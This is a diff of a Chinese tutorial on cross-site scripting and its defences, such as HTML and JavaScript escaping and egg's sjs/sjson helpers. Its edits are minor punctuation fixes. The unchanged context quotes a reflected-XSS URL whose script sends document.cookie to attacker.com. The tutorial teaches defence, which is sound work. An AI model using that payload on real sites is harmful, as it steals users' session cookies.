@@ -36,7 +36,7 @@ xss（cross-site scripting跨域脚本攻击），一般分为两类：
 这种类型的xss攻击是简单地把用户输入的数据“反射”给浏览器。此时黑客需要诱使用户“点击”一个恶意链接，才能成功。
 
 案例一：
-1. 用户登录某网站(www.myWeb.com)，产生认证token，存储在cookie中，如`set cookie: sessId=183dsjfk3498djncrueiw`
+1. 用户登录某网站(www.myWeb.com)，产生认证token，存储在cookie中，如`set cookie: sessId=183dsjfk3498djncrueiw`。
 1. 存在某页面`www.myWeb.com/somePage`，它会获取地址栏中的message参数
 1. 黑客通过一些途径让用户提交如下url，`www.myWeb.com/somePage?message=<script>var+i=new+Image;i.src="http://attacker.com/"%2bdocument.cookie</script>`
 1. somePage页面通过提取message执行了里面的script代码，也想攻击者的网站attacker.com发起请求，并将cookie带了过去
@@ -50,7 +50,7 @@ xss（cross-site scripting跨域脚本攻击），一般分为两类：
 var i = new Image
 i.src = "http://attacker.com/" + document.cookie
 ```
-等于向黑客的地址发起了一个请求，并且带上了用户自己的cookie
+等于向黑客的地址发起了一个请求，并且带上了用户自己的cookie
 
 案例二：  
 有个如下的页面  
@@ -145,7 +145,7 @@ escape(html)
 ```
 
 ### 提供给javascript来使用
-有时我们输出的内容需要提供给网页的javascript来使用，做到动态配置的作用
+有时我们输出的内容需要提供给网页的javascript来使用，做到动态配置的作用
 ```javascript
 var foo = '"hello"'
 
@@ -155,7 +155,7 @@ console.log(`var foo = "${foo}";`)
 
 这是我们需要将变量中的字符进行javascript encode，将所有非白名单字符转义为`\`形式，并且放在引号内部。
 
-阿里的 [egg](https://github.com/eggjs/egg/) 框架提供了一个`helper.sjs`的工具帮我们做到这一点，具体原码可到这里看 [sjs](https://github.com/eggjs/egg-security/blob/master/lib/helper/sjs.js)
+阿里的 [egg](https://github.com/eggjs/egg/) 框架提供了一个`helper.sjs`的工具帮我们做到这一点，具体原码可到这里看 [sjs](https://github.com/eggjs/egg-security/blob/master/lib/helper/sjs.js)
 ```javascript
 var foo = '"hello"'
 
@@ -166,9 +166,9 @@ var sjs = require('./sjs')
 sjs(`var foo = "${foo}";`)
 // var foo = "\\x22hello\\x22";
 ```
-该库会将非数字、非字母进行转义成十六进制格式，并在前面加上`\\xx`。
+该库会将非数字、非字母进行转义成十六进制格式，并在前面加上`\\xx`。
 
-有时我们还需要处理json数据，json也容易被xss利用，也需要转义，egg也提供了`helper.sjon`做json encode，具体可以看 [egg sjson源码](https://github.com/eggjs/egg-security/blob/master/lib/helper/sjson.js)。  该库会遍历json中的每个键值对，做编码处理，因此会有一定的性能开销，要慎重使用。
+有时我们还需要处理json数据，json也容易被xss利用，也需要转义，egg也提供了`helper.sjon`做json encode，具体可以看 [egg sjson源码](https://github.com/eggjs/egg-security/blob/master/lib/helper/sjson.js)。  该库会遍历json中的每个键值对，做编码处理，因此会有一定的性能开销，要慎重使用。
 
 ### 富文本输出格式化
 当页面允许用户录入页面排版、格式控制相关的HTML时，我们需要对用户的输入进行过滤和格式化，通过白名单的方式来控制允许的标签和属性。
